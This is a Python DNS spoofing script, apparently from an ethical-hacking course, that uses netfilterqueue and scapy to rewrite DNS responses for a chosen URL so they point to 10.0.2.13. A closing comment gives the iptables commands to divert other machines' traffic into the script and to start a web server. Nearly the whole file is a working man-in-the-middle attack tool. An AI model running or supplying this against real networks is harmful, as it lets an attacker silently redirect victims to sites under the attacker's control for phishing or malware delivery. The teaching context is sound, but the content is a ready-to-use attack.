# DNS Spoofer

#!/use/bin/env python
import netfilterqueue, scapy.all as scapy, optparse

url = []

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-u", "--url", dest="url", help="URL to spoof")
    (options, arguments) = parser.parse_args()
    if not options.url:
        parser.error("[-] Please specify a URL to spoof. Use --help for more info.")
    return options

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if url in qname:
            print("[+] Spoofing target...")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.13")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            
            packet.set_payload(str(scapy_packet))
    packet.accept()

options = get_arguments()
url = options.url

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

'''
service apache2 start    # Starts webserver.
iptables -I FORWARD -j NFQUEUE --queue-num 0    # FORWARD is name of chain that packets from other computers go through. Use INPUT and OUTPUT for your own computer.
iptables --flush    # After finishing this program, remove iptables.
This program will not work on HTTPS since this does not have a function allowing it to bypass HTTPS. So use this on HTTP.
https://www.udemy.com/learn-python-and-ethical-hacking-from-scratch/learn/v4/t/lecture/10244436?start=0 (Redirecting DNS Responses)
'''
